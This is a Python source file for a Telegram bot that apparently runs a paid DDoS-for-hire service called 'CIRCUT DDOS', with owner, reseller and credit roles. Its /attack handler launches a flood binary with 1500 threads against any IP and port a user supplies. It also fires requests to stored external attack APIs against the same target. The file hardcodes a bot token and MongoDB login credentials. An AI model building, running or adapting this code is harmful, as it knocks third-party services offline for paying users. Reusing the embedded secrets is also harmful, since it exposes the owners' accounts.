import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500 
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    api_collection = db.apis 
    admins_collection = db.admins 
    settings_collection = db.settings 
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# Global Variables
active_attacks = [] 
attack_lock = Lock()
DEFAULT_THREADS = 1500 

# --- PERMISSION HELPERS ---
def get_user_role(user_id):
    if user_id == PRIMARY_ADMIN: return "owner"
    admin_data = admins_collection.find_one({"user_id": user_id})
    return admin_data.get("role") if admin_data else "user"

def is_owner(user_id):
    return get_user_role(user_id) == "owner"

def is_reseller(user_id):
    role = get_user_role(user_id)
    return role == "reseller" or role == "owner"

# --- KEYBOARD ---
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

# --- SETTINGS ---
def get_settings():
    settings = settings_collection.find_one({"id": "bot_settings"})
    if not settings:
        default = {"id": "bot_settings", "max_time": 300, "total_slots": 1}
        settings_collection.insert_one(default)
        return default
    return settings

# --- CORE COMMANDS ---

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(message.chat.id, "🌍 *CIRCUT DDOS IS ONLINE!*\n\nUse `/help` to see all commands.", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_cmd(message):
    user_id = message.from_user.id
    role = get_user_role(user_id)
    help_text = "🌟 *COMMAND LIST* 🌟\n\n"
    help_text += "*👤 User:* `/attack`, `/myinfo`, `/status`\n"
    if is_reseller(user_id):
        help_text += "*🤝 Reseller:* `/addcredits`, `/listapi`\n"
    if is_owner(user_id):
        help_text += "*👑 Owner:* `/addowner`, `/addreseller`, `/apiurl`, `/maxtime`, `/addslot`"
    bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

# --- ADMIN & MANAGEMENT ---

@bot.message_handler(commands=['apiurl'])
def apiurl_cmd(message):
    if not is_owner(message.from_user.id): return
    try:
        args = message.text.split()
        url, key = args[1], args[2]
        api_collection.update_one({"url": url}, {"$set": {"key": key}}, upsert=True)
        bot.send_message(message.chat.id, "✅ *API Updated!*")
    except: bot.send_message(message.chat.id, "❗ `/apiurl URL KEY`")

@bot.message_handler(commands=['addcredits'])
def addcredits_cmd(message):
    if not is_reseller(message.from_user.id): return
    try:
        args = message.text.split()
        target, amt = int(args[1]), int(args[2])
        users_collection.update_one({"user_id": target}, {"$inc": {"credits": amt}}, upsert=True)
        bot.send_message(message.chat.id, f"✅ Credits added to `{target}`")
    except: pass

@bot.message_handler(commands=['maxtime'])
def maxtime_cmd(message):
    if not is_owner(message.from_user.id): return
    try:
        t = int(message.text.split()[1])
        settings_collection.update_one({"id": "bot_settings"}, {"$set": {"max_time": t}})
        bot.send_message(message.chat.id, f"✅ Max time: `{t}s`")
    except: pass

@bot.message_handler(commands=['addslot'])
def addslot_cmd(message):
    if not is_owner(message.from_user.id): return
    try:
        s = int(message.text.split()[1])
        settings_collection.update_one({"id": "bot_settings"}, {"$set": {"total_slots": s}})
        bot.send_message(message.chat.id, f"✅ Slots: `{s}`")
    except: pass

# --- ATTACK ENGINE ---

async def run_attack(chat_id, ip, port, dur, atk_id):
    global active_attacks
    cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {ip} {port} {dur} {DEFAULT_THREADS}"
    for api in list(api_collection.find()):
        try: requests.get(f"https://{api['url']}/api?key={api['key']}&host={ip}&port={port}&time={dur}", timeout=4)
        except: pass
    try:
        p = subprocess.Popen(cmd, shell=True)
        await asyncio.sleep(dur)
        p.terminate()
    finally:
        with attack_lock:
            if atk_id in active_attacks: active_attacks.remove(atk_id)
        bot.send_message(chat_id, "✅ *Attack Finished!*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    setts = get_settings()

    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Need 5 credits!*")
        return

    with attack_lock:
        if len(active_attacks) >= setts['total_slots']:
            bot.send_message(message.chat.id, "⚠️ *Slots Full!*")
            return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "❌ *Usage:* `/attack ip port time`", parse_mode='Markdown')
        return

    try:
        ip, port, dur = args[1], int(args[2]), int(args[3])
        if dur > setts['max_time']:
            bot.send_message(message.chat.id, f"❌ Max: {setts['max_time']}s")
            return

        users_collection.update_one({"user_id": user_id}, {"$inc": {"credits": -5}})
        atk_id = f"{ip}_{port}_{time.time()}"
        with attack_lock: active_attacks.append(atk_id)

        bot.send_message(message.chat.id, f"🚀 *Launched!* (-5 Credits)\n🎯 `{ip}:{port}`", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_attack(message.chat.id, ip, port, dur, atk_id), attack_loop)
    except: pass

# --- RUN ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()
